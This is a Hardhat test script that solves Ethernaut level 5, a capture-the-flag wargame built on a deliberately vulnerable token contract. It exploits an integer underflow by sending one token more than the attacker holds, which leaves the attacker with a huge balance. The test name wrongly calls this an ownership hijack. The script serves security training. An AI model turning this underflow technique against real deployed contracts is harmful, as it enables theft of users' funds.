import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Token} from '../../types/typechain';

describe('Ethernaut 5: Token', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: Token;

  const ATTACKER_BALANCE = 20;
  const INITIAL_SUPPLY = 1_000_000;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('Token', owner).then(f => f.deploy(INITIAL_SUPPLY));
    await contract.deployed();

    // attacker has 20 tokens
    contract.transfer(attacker.address, ATTACKER_BALANCE);
  });

  it('should hijack ownership', async () => {
    // send just one more than your balance to underflow
    await contract.connect(attacker).transfer(ethers.constants.AddressZero, ATTACKER_BALANCE + 1);
  });

  after(async () => {
    // new balance should be a lot more
    expect((await contract.balanceOf(attacker.address)).gt(ATTACKER_BALANCE * 100)).to.be.true;
  });
});
